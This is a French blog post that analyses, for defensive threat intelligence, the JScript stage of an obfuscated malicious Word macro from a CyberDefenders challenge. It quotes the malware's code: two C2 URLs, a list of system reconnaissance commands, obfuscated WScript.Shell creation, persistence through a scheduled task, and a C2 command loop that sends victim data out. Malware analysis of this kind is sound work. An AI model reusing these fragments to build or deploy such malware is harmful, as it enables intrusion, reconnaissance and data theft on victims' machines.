---
title: "JScript et threat intelligence : analyse d'un code malveillant"
date: 2023-10-10T22:08:20+02:00
draft: false
---

Il y a quelques temps, j'ai résolu le challenge [Obfuscated](https://cyberdefenders.org/blueteam-ctf-challenges/76#nav-questions) de Cyberdefenders. Cependant, le challenge s'arrête juste avant l'analyse du code qui intéragit avec le C2. J'ai donc décidé de poursuivre l'analyse afin de comprendre en détail son fonctionnement et pourquoi pas faire un peu de Threat Intelligence...

Il sera question de mettre en contexte l'analyse en rappellant les éléments essentiels du challenge, décortiquer le code malveillant afin de comprendre ses actions pour enfin analyser la menace dans le but de dégager une tendance.

## Rappel du challenge

En résumé, nous sommes un analyste spécialisé qui a reçu une alerte à propos d'un poste utilisateur au comportement étrange. On nous livre un document Word qui semble être la source de cette alerte.

Le document contient des macros, c'est-à-dire du script embarqué qui est utilisé pour automatiser un certains nombre de tâches. Cependant, les pirates utilisent cette fonctionnalité pour infecter des postes. Afin d'être plus discret et complexifier le travail des analystes, le code est  obfusqué et l'infection est en plusieurs étapes. Le code est du `JScript` qui est un fichier de scripting Microsoft qui permet de lancer des commandes, c'est plutôt proche du `Javascript` avec quelques ajouts en plus, comme la possibilité d'intéragir avec le système hôte.

Le code malveillant contient de la donnée codée en base64 et une implémentation d'un chiffrement type RC4 qui permet de déchiffrer la donnée obtenue après le décodage du base64. Une fois ceci fait, le challenge est terminé, et pourtant il nous reste le code le plus intéressant à explorer.

## Au pays du JScript

### Initialisation

Le code est toujours obfusqué, mais il me semble qu'il l'est moins que lors de l'étape précédente ; quelques variables ont un nom "en clair" :

```javascript
for (var count = 0; count < ayuh; count++) {
        switch (Math.ceil(Math.random() * 3)) {
            case 1:
                name = name + Math.ceil(Math.random() * 8);
                break;
[...]
eV_C("TaskManager", "Windows Task Manager", username, v_FileName, "EzZETcSXyKAdF_e5I2i1", wyKN, false);
```

La première étape initialise certaines variables pour la suite du script :

- stockage des deux URLs des C2 dans une variable, les URLs ne sont pas obfusquées.

- stockage des commandes de reconnaissance du système dans une variable, non obfusquées.

- initialisation d'une variable qui contient le nom du script, elle sera utilisée plus tard.

```javascript
var CKpR = new Array("http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php", "http://www.folk-cantabria.com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field.php");
var tpO8 = "w3LxnRSbJcqf8HrU";
var recon_commands = new Array("systeminfo > ", "net view >> ", "net view /domain >> ", "tasklist /v >> ", "gpresult /z >> ", "netstat -nao >> ", "ipconfig /all >> ", "arp -a >> ", "net share >> ", "net use >> ", "net user >> ", "net user administrator >> ", "net user /domain >> ", "net user administrator /domain >> ", "set  >> ", "dir %systemdrive%\x5cUsers\x5c*.* >> ", "dir %userprofile%\x5cAppData\x5cRoaming\x5cMicrosoft\x5cWindows\x5cRecent\x5c*.* >> ", "dir %userprofile%\x5cDesktop\x5c*.* >> ", "tasklist /fi \x22modules eq wow64.dll\x22  >> ", "tasklist /fi \x22modules ne wow64.dll\x22 >> ", "dir \x22%programfiles(x86)%\x22 >> ", "dir \x22%programfiles%\x22 >> ", "dir %appdata% >>");
var QUjy = new ActiveXObject("Scripting.FileSystemObject");
var script_name = WScript.ScriptName;
```

Le programme va initialiser la classe WScriptShell qui permettra par la suite d'exécuter les commandes ci-dessus. Cette initialisation est obfusquée en deux étapes, sans doute pour ne pas déclencher l'antivirus.

```javascript
function get_WScriptShell() {// ActiveXObject(WScript.Shell())
    var spq3 = this['\u0041\u0063\u0074i\u0076eX\u004F\u0062j\u0065c\u0074'];
    // ActiveXObject
    var zBVv = new spq3('\u0057\u0053cr\u0069\u0070\u0074\u002E\u0053he\u006C\u006C');
    // WScript.Shell
    return zBVv;
}
```

### Premier niveau de persistance : copie du script

Le code se localise dans le système de la victime puis va chercher à se copier dans `c:\Users\<username>\AppData\Local\Microsoft\Windows\` ou `c:\Users\<username>\AppData\Local\Temp\` ou `c:\Documents and Settings\<username>\Application Data\Microsoft\Windows\`, selon si les chemins existent sur le système.

Le malware va également essayer de se maintenir dans le système en se copiant dans le premier répertoire existant, avant de se mettre en dormance pendant un temps variable entre 5 et 10 minutes.

### Second niveau de persistance : tâche planifiée

Après la dormance, le script va se créer une tâche planifiée dont voici les caractéristiques :

- la tâche est créée sous l'identifiant de l'utilisateur courant.

- la description de la tâche est générique : `Windows Task Manager`.

- la tâche est immédiatement activée et démarerra dès que possible.

- la tâche n'est pas masquée à l'utilisateur.

- la date de début et de fin du déclencheur de la tâche sont `2015-07-12T11:47:24` et `2020-03-21T08:00:00` (non obfusquées).

- la tâche s'exécute quand l'utilisateur est connecté au système.

- l'action de la tâche est d'exécuter le programme envoyé par le C2.

- l'argument envoyé au programme est `EzZETcSXyKAdF_e5I2i1`, qui était une clef de déchiffrement de la première étape d'infection.

- le payload final s'exécutera dans le premier emplacement disponible (voir le premier niveau de persistance).

### Reconnaissance

Avant de recevoir les indications du C2, le programme effectue de la reconnaissance avec `cmd.exe`. Il cherche à obtenir des informations sur la machine de la victime mais également sur les connexions réseaux et les tâches planifiées.

Le programme créé également un fichier `~dat.tmp` à l'endroit où il aura réussi à se copier pour contenir les informations de la reconnaissance.

```
systeminfo >
net view >>
net view /domain >>
tasklist /v >>
gpresult /z >>
netstat -nao >>
ipconfig /all >>
arp -a >>
net share >>
net use >>
net user >>
net user administrator >>
net user /domain >>
net user administrator /domain >>
set  >>
dir %systemdrive%\x5cUsers\x5c*.* >>
dir %userprofile%\x5cAppData\x5cRoaming\x5cMicrosoft\x5cWindows\x5cRecent\x5c*.* >>
dir %userprofile%\x5cDesktop\x5c*.* >>
tasklist /fi \x22modules eq wow64.dll\x22  >> 
tasklist /fi \x22modules ne wow64.dll\x22 >>
dir \x22%programfiles(x86)%\x22 >>
dir \x22%programfiles%\x22 >> 
dir %appdata% >>
```

Voici un exemple de ce que produisent ces commandes :

```
Nom de l'h“te:                              WINOUT
Nom du systŠme d'exploitation:              Microsoft Windows 11 Professionnel
Version du systŠme:                         10.0.22621 N/A build 22621
Fabricant du systŠme d'exploitation:        Microsoft Corporation
Configuration du systŠme d'exploitation:    Station de travail autonome
Type de build du systŠme d'exploitation:    Multiprocessor Free
Propri‚taire enregistr‚:                    <username>@outlook.fr
Organisation enregistr‚e:                   
Identificateur de produit:                  00330-52085-32356-AAOEM
Date d'installation originale:              09/05/2023, 17:06:41
Heure de d‚marrage du systŠme:              04/10/2023, 20:08:47
Fabricant du systŠme:                       Dell Inc.
ModŠle du systŠme:                          Latitude 5590
Type du systŠme:                            x64-based PC
Processeur(s):                              1 processeur(s) install‚(s).
                                            [01]ÿ: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~1600 MHz
Version du BIOS:                            Dell Inc. 1.17.0, 02/06/2021
R‚pertoire Windows:                         C:\Windows
R‚pertoire systŠme:                         C:\Windows\system32
P‚riph‚rique d'amor‡age:                    \Device\HarddiskVolume4
Option r‚gionale du systŠme:                fr;Fran‡ais (France)
ParamŠtres r‚gionaux d'entr‚e:              fr;Fran‡ais (France)
Fuseau horaire:                             (UTC+01:00) Bruxelles, Copenhague, Madrid, Paris
M‚moire physique totale:                    16ÿ242 Mo
M‚moire physique disponible:                9ÿ771 Mo
M‚moire virtuelleÿ: taille maximale:        17ÿ266 Mo
M‚moire virtuelleÿ: disponible:             10ÿ146 Mo
M‚moire virtuelleÿ: en cours d'utilisation: 7ÿ120 Mo
Emplacements des fichiers d'‚change:        C:\pagefile.sys
Domaine:                                    WORKGROUP
Serveur d'ouverture de session:             \\WINOUT
Correctif(s):                               5 Corrections install‚es.
                                            [01]: KB5029921
                                            [02]: KB5012170
                                            [03]: KB5026039
                                            [04]: KB5030219
                                            [05]: KB5028756
Carte(s) r‚seau:                            4 carte(s) r‚seau install‚e(s).
                                            [01]: Intel(R) Ethernet Connection (4) I219-LM
                                                  Nom de la connexionÿ: Ethernet
                                                  tatÿ:                Support d‚connect‚
                                            [02]: Intel(R) Dual Band Wireless-AC 8265
                                                  Nom de la connexionÿ: Wi-Fi
                                                  DHCP activ‚ÿ:         Oui
                                                  Serveur DHCPÿ:        10.0.0.1
                                                  Adresse(s) IP
                                                  [01]: 10.0.0.53
                                                  [02]: fe80::e3e8:bd35:b540:b965
                                            [03]: Bluetooth Device (Personal Area Network)
                                                  Nom de la connexionÿ: Connexion r‚seau Bluetooth
                                                  tatÿ:                Support d‚connect‚
                                            [04]: VirtualBox Host-Only Ethernet Adapter
                                                  Nom de la connexionÿ: Ethernet 2
                                                  DHCP activ‚ÿ:         Non
                                                  Adresse(s) IP
                                                  [01]: <IP>
                                                  [02]: <address>
Configuration requise pour Hyper-V:         Extensions de mode du moniteur d'ordinateur virtuelÿ: Oui
                                            Virtualisation activ‚e dans le microprogrammeÿ: Oui
                                            Traduction d'adresse de second niveauÿ: Oui
                                            Pr‚vention de l'ex‚cution des donn‚es disponibleÿ: Oui

```

### Communication avec les C2

La fonction centrale de se programme se trouve ici. Une boucle infinie var garder le programme vivant afin de permettre aux attaquants d'envoyer des commandes au programme.

Tout d'abord, le programme va envoyer au C2 les informations de la victime via une requête HTTP, avec un user-agent unique qui dépend de la machine infectée :

```javascript
Kpxo.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + get_victim_id());
```

Les informations semblent chiffrées via un algorithme maison. Ensuite, un switch/case indique les différentes commandes que le programme peut recevoir du C2 avant de se mettre en dormance pour une durée d'environ une heure : 

```javascript
switch (f3cb) {
    case "good":
        break;
    case "exit":
        WScript.Quit();
        break;
    case "work":
        work(Ysyo);
        break;
    case "fail":
        fail();
        break;
    default:
    break;
}
//...
WScript.Sleep((Math.random() * 300 + 3600) * 1000);
```

La fonction `work` semble télécharger le payload, le lancer et envoyer l'information au C2 si le lancement à réussi, sans chercher à envoyer l'erreur.

La fonction `fail`, quant à elle, créée une tâche planifiée avant de la supprimer aussitôt et quitte le programme.

## Analyse de la menace

Il est ici question d'aller plus loin que la lecture de code. Mon objectif est de monter dans la [Pyramide de la douleur](https://www.sans.org/tools/the-pyramid-of-pain/) ; aller plus loin que l'extraction habituelle d'IoCs comme des IP ou des noms de domaine mais essayer de comprendre la cible de ce malware et les objectifs de leurs auteurs. Cette analyse est sujet à mes interprétations.

A mon sens, ce code malveillant n'a pas été créé par un APT et n'est pas non plus à son usage. Plusieurs indications vont dans ce sens, à commencer par le fait qu'aucun message d'erreur n'est envoyé vers les C2. Il n'y a pas la volonté de compromettre à tout prix **la** machine sur laquelle est présent le document. De plus, le code n'a pas l'air de contenir une détection de VM, il n'y a pas la volonté de se protéger contre les analystes. Cependant, il est possible que les informations de reconnaissance envoyés aux C2 puissent servir à cet usage. Enfin, les dates du déclenchement de la tâche planifiée, et donc par extension du malware final, ne sont pas précises. Tout cela tend à montrer qu'il n'y a pas un ciblage particulier.

De plus, la reconnaissance est automatisée et particulièrement bruyante. Les commandes sont lancées les unes à la suite des autres et `net user`, par exemple, est un marqueur très fort pour tout analyste SOC. Dans le même esprit, les noms de domaines utilisées (`http://www.saipadiesel124.com/` et `http://www.folk-cantabria.com/`) pourraient sembler suspects pour un analyste SOC, à cause de leur nom, d'une part, mais également à cause du trafic en `HTTP`, d'autre part.

L'exécution finale du script est plus obfusquée que le reste du code (`WScriptShell`), à mon sens, cela traduit la volonté de ne pas déclencher un antivirus. Un dernier élément plus spéculatif est l'utilisation de la clef de chiffrement `EzZETcSXyKAdF_e5I2i1`, qui a été utilisée pour déchiffrer une partie du code `JScript`, et qui pourrait être utilisée de nouveau pour déchiffrer le malware final. La cible pourrait donc être une entreprise très faiblement protégée voire un poste non monitoré d'un particulier.

Enfin, le payload est exécuté uniquement quand l'utilisateur est connecté et la reconnaissance traduit une volonté de se latéraliser ; les pirates partant du principe que le malware peut se trouver sur un poste sans intérêt. De plus, l'utilisation, par les C2, de `Wordpress` peut laisser penser à une industrialisation de l'infrastructure, et, par extension, d'une recherche de rentabilité.

En conclusion, il semblerait que ce code soit à destination d'une cible peu protégée, peu monitorée et peu ou pas ciblée. Cela indique que les pirates ratissent large, probablement dans un but financier.
